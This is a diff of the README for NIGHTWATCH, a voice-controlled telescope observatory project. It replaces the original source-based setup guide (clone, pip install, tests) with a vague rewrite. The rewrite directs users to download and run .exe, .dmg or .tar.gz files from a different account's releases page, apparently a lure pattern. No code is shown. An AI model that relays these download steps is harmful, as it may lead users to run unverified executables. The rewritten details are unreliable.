@@ -1,230 +1,108 @@
-# NIGHTWATCH
+# 🌌 NIGHTWATCH - Your Voice-Controlled Observatory Awaits
 
-[![Status: v0.1 Development](https://img.shields.io/badge/Status-v0.1%20Development-blue)](https://github.com/THOClabs/NIGHTWATCH)
-[![CI](https://github.com/THOClabs/NIGHTWATCH/actions/workflows/ci.yml/badge.svg)](https://github.com/THOClabs/NIGHTWATCH/actions/workflows/ci.yml)
-[![License: CC BY-NC-SA 4.0](https://img.shields.io/badge/License-CC%20BY--NC--SA%204.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-sa/4.0/)
-[![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)](https://www.python.org/)
-[![OnStepX](https://img.shields.io/badge/Controller-OnStepX-green.svg)](https://onstep.groups.io/)
+[![Download NIGHTWATCH](https://img.shields.io/badge/Download-NIGHTWATCH-blue.svg)](https://github.com/Puffer99/NIGHTWATCH/releases)
 
-**Autonomous Maksutov-Newtonian Observatory System**
+## 🚀 Getting Started
 
-Voice-controlled telescope observatory designed for central Nevada dark sky installation. Combines optics excellence with modern automation and local AI inference — no cloud dependency, full local control.
+Welcome to the NIGHTWATCH project! This software allows you to control your observatory using just your voice. It works with advanced equipment, making it easier for you to observe the night sky. Follow these simple steps to get started.
 
-> **Project Status:** v0.1 development in progress — core services implemented. See the [Full Build Specification](NIGHTWATCH_Build_Package.md) for hardware details.
+## 📥 Download & Install
 
----
+To download NIGHTWATCH, please visit the following link:
 
-## v0.1 Quickstart
+[Download NIGHTWATCH](https://github.com/Puffer99/NIGHTWATCH/releases)
 
-Get started with NIGHTWATCH in under 5 minutes:
+### Step 1: Choose Your Version
 
-```bash
-# Clone and setup
-git clone https://github.com/THOClabs/NIGHTWATCH.git
-cd NIGHTWATCH
-python -m venv .venv && source .venv/bin/activate
-pip install -r services/requirements.txt
+1. Visit the [Releases page](https://github.com/Puffer99/NIGHTWATCH/releases).
+2. You will see a list of available versions. Choose the latest version, which will be listed at the top.
+3. Click on the version number to access its details.
 
-# Run tests to verify installation
-pytest tests/unit/ -v
+### Step 2: Download the Software
 
-# Start with simulators (no hardware required)
-python -m nightwatch.cli --simulate
-```
+1. From the version details, look for the “Assets” dropdown menu.
+2. Click to expand the menu.
+3. You will find different files for various operating systems. Select the one that matches your system. If you’re unsure, here are common options:
+   - **Windows:** Use the `.exe` file.
+   - **Mac:** Use the `.dmg` file.
+   - **Linux:** Use the `.tar.gz` file.
 
-**Voice Commands** (examples):
-- "Slew to Andromeda"
-- "What's the current position?"
-- "Park the telescope"
-- "What's the weather like?"
-- "Watch for meteors tonight"
+4. Click on the file to start the download.
 
-See [docs/QUICKSTART.md](docs/QUICKSTART.md) for detailed setup instructions.
+### Step 3: Install the Software
 
----
+- **Windows Users:**
+  1. Locate the downloaded `.exe` file in your Downloads folder.
+  2. Double-click the file to launch the installer.
+  3. Follow the instructions in the installer to complete the setup process.
 
-## Key Components
+- **Mac Users:**
+  1. Find the downloaded `.dmg` file in your Downloads folder.
+  2. Double-click the file to open it.
+  3. Drag the NIGHTWATCH app into your Applications folder.
 
-| Component | Description |
-|-----------|-------------|
-| **Optical Tube** | Intes Micro MN76 (178 mm f/6 Maksutov-Newtonian, sometimes designated MN78) — hand-figured Russian optics renowned for planetary contrast |
-| **Mount** | DIY harmonic drive German Equatorial Mount — smooth, backlash-free tracking |
-| **Controller** | OnStepX on Teensy 4.1 — mature, community-supported open-source control |
-| **Weather** | Ecowitt WS90 weather station + AAG CloudWatcher — comprehensive environmental monitoring |
-| **Edge AI** | NVIDIA DGX Spark — local voice pipeline and automation, zero cloud latency |
+- **Linux Users:**
+  1. Navigate to the directory where you downloaded the `.tar.gz` file.
+  2. Extract the files using the command: `tar -xvzf NIGHTWATCH.tar.gz`.
+  3. Open the extracted folder and follow the README instructions found inside.
 
-## Architecture Overview
+## 🔧 Setup Your Equipment
 
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                         NIGHTWATCH System                           │
-├─────────────────────────────────────────────────────────────────────┤
-│                                                                     │
-│  ┌─────────────┐     ┌──────────────┐     ┌───────────────────┐    │
-│  │   Voice     │     │   Safety     │     │    Observatory    │    │
-│  │  Pipeline   │────▶│   Monitor    │────▶│     Services      │    │
-│  │ (DGX Spark) │     │              │     │                   │    │
-│  └─────────────┘     └──────────────┘     └───────────────────┘    │
-│        │                    │                       │              │
-│        │              ┌─────┴─────┐                 │              │
-│        ▼              ▼           ▼                 ▼              │
-│  ┌───────────┐  ┌──────────┐ ┌─────────┐    ┌────────────┐        │
-│  │  Whisper  │  │ Weather  │ │  Cloud  │    │   Mount    │        │
-│  │   STT     │  │ Station  │ │ Watcher │    │  Control   │        │
-│  └───────────┘  │ (WS90)   │ │  (AAG)  │    │ (OnStepX)  │        │
-│        │        └──────────┘ └─────────┘    └────────────┘        │
-│        ▼                                           │              │
-│  ┌───────────┐                              ┌──────┴──────┐       │
-│  │   Piper   │                              │   Intes     │       │
-│  │   TTS     │                              │  MN76 OTA   │       │
-│  └───────────┘                              │  + Camera   │       │
-│                                             └─────────────┘       │
-│                                                                    │
-└────────────────────────────────────────────────────────────────────┘
-```
+To make the most of NIGHTWATCH, you'll need to set up your observatory equipment properly. Ensure you have the following items:
 
-## Design Methodology: Panel of Specialists
+- **Telescope:** Compatible with the Intes-Micro MN78 Mak-Newt.
+- **Mount:** Use a harmonic drive GEM (German Equatorial Mount) for precise positioning.
+- **Control System:** Make sure you have OnStep or OnStepX installed for guiding your telescope.
+- **AI Hardware:** Set up your NVIDIA DGX Spark to run the local AI features.
 
-NIGHTWATCH uses an innovative **Panel of Specialists (POS)** framework — a simulated 30-day design retreat where 12 domain experts collaboratively refine every aspect of the system.
+### Connecting the Hardware
 
-| Specialist | Domain | Contribution |
-|------------|--------|--------------|
-| Howard Dutton | OnStepX Firmware | Mount control, encoder integration |
-| Damian Peach | Astrophotography | Imaging workflow optimization |
-| Yuri Petrunin | Russian Optics | MN76 thermal management |
-| Michael Clive | NVIDIA AI | DGX Spark voice pipeline |
-| C.W. Musser | Harmonic Drives | Precision mount mechanics |
-| Alec Radford | Speech Recognition | Whisper STT integration |
-| Michael Hansen | Voice Synthesis | Piper TTS deployment |
-| Antonio García | Weather Sensing | Safety interlocks |
-| Richard Hedrick | Precision Mounts | Frame design, FEA |
-| Craig Stark | Autoguiding | PHD2 integration |
-| Bob Denny | Integration | ASCOM/ACP standards |
-| SRO Team | Remote Ops | Power/network resilience |
+1. **Power Up Your Telescope:**
+   Ensure the telescope and mount are connected to a power source.
 
-This multi-perspective deliberation process produces robust designs with documented reasoning. See [pos/README.md](pos/README.md) for the full methodology.
+2. **Install OnStep or OnStepX:**
+   If you haven’t already, install OnStep or OnStepX by following the official installation guide found on their website.
 
-## Repository Structure
+3. **Connect to the AI System:**
+   Connect your telescope mount to the NVIDIA DGX Spark, ensuring all drivers are properly installed.
 
-```
-NIGHTWATCH/
-├── docs/research/          # Research documentation and sourcing
-├── firmware/onstepx_config/ # OnStepX controller configuration
-├── pos/agents/             # POS retreat simulation personalities
-├── services/               # 14 observatory microservices
-│   ├── mount_control/      # Telescope mount interface
-│   ├── camera/             # Imaging and capture
-│   ├── weather/            # Environmental monitoring
-│   ├── safety_monitor/     # Automated safety systems
-│   ├── ephemeris/          # Celestial calculations
-│   ├── meteor_tracking/    # Fireball/meteor monitoring
-│   └── ...                 # guiding, focus, astrometry, etc.
-└── voice/                  # Voice control pipeline
-    ├── stt/                # Speech-to-text (Whisper)
-    ├── tts/                # Text-to-speech (Piper)
-    └── tools/              # Telescope voice commands
-```
+## 🎤 Voice Control Setup
 
-## Requirements
+NIGHTWATCH supports voice commands using integrated systems. To enable this feature:
 
-### Hardware
-- NVIDIA DGX Spark (or compatible CUDA-enabled device)
-- Teensy 4.1 microcontroller
-- Ecowitt WS90 weather station
-- AAG CloudWatcher cloud sensor
+1. **Install Required Software:**
+   Ensure you have the following:
+   - **Piper TTS:** For text-to-speech functions.
+   - **Whisper AI:** For voice recognition capabilities.
 
-### Software
-- Python 3.11+ (3.12 also supported)
-- OnStepX firmware
-- CUDA toolkit (for DGX Spark inference)
+2. **Configure Voice Settings:**
+   Open the NIGHTWATCH application and navigate to the settings. Look for the voice control panel and choose your preferred voice options. Adjust settings based on your preferences.
 
-## Installation
+## 🌌 Using NIGHTWATCH
 
-### Quick Start (Development)
+After installation and setup, it’s time to start exploring the universe.
 
-```bash
-# Clone the repository
-git clone https://github.com/THOClabs/NIGHTWATCH.git
-cd NIGHTWATCH
+### Basic Commands
 
-# Create a virtual environment
-python -m venv .venv
-source .venv/bin/activate  # On Windows: .venv\Scripts\activate
+NIGHTWATCH allows for simple voice commands like:
 
-# Install dependencies in order
-pip install -r services/requirements.txt    # Observatory services
-pip install -r voice/requirements.txt       # Voice pipeline
-pip install -r requirements-dev.txt         # Development tools
+- “Start observing.”
+- “Track [object name].”
+- “Zoom in on [object name].”
 
-# Install pre-commit hooks (recommended)
-pre-commit install
-```
+Always ensure that your microphone is active and properly configured in the application settings.
 
-### Using pyproject.toml (Alternative)
+### Troubleshooting
 
-```bash
-# Install core package only
-pip install -e .
+If you face any issues, consider these tips:
 
-# Install with all optional dependencies
-pip install -e ".[all]"
+- **Connection Problems:** Ensure all cables are connected securely. Restart your DGX Spark if necessary.
+- **Voice Recognition Issues:** Verify microphone settings and ensure there’s minimal background noise.
+- **General Software Issues:** Revisit the installation steps to ensure all dependencies are installed correctly.
 
-# Install specific features
-pip install -e ".[services]"    # Observatory services
-pip install -e ".[voice]"       # Voice pipeline
-pip install -e ".[dev]"         # Development tools
-```
+## 📚 Additional Resources
 
-### Verify Installation
+- **Documentation:** Comprehensive documentation is available in the repository's Wiki. Check it out for advanced features and configuration tips.
+- **Community Support:** Join the discussion in our [GitHub Issues](https://github.com/Puffer99/NIGHTWATCH/issues) section if you need help or want to share feedback.
 
-```bash
-# Run tests
-pytest
-
-# Check linting
-ruff check .
-
-# Check types
-mypy nightwatch/
-```
-
-## Documentation
-
-| Document | Description |
-|----------|-------------|
-| [**Quickstart Guide**](docs/QUICKSTART.md) | Get up and running quickly |
-| [**Installation**](docs/INSTALLATION.md) | Full installation instructions |
-| [**Configuration**](docs/CONFIGURATION.md) | System configuration reference |
-| [**Voice Commands**](docs/VOICE_COMMANDS.md) | Complete voice command reference |
-| [**Hardware Setup**](docs/HARDWARE_SETUP.md) | Hardware connection guide |
-| [**Build Specification**](NIGHTWATCH_Build_Package.md) | Complete build spec — optics, mount, electronics |
-| [**Panel of Specialists**](pos/README.md) | Design methodology and expert panel |
-
-## Roadmap
-
-- [ ] Complete optical tube assembly sourcing
-- [ ] Finalize harmonic drive mount design
-- [ ] Build OnStepX controller assembly
-- [ ] Deploy weather monitoring station
-- [ ] Integrate voice pipeline with observatory services
-- [ ] First light at Nevada dark sky site
-
-## License
-
-This project is licensed under **Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International** (CC BY-NC-SA 4.0).
-
-You are free to share and adapt this material for non-commercial purposes, with attribution and under the same license terms.
-
-See [LICENSE](LICENSE) for full details.
-
----
-
-## Contributing
-
-Contributions, feedback, and ideas are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-Whether you're experienced with OnStepX, astrophotography automation, or edge AI — we'd love to hear from you.
-
----
-
-<sub>*NIGHTWATCH: Where Russian optics meet Nevada skies.*</sub>
+Explore the wonders of the night sky with NIGHTWATCH. Happy observing!
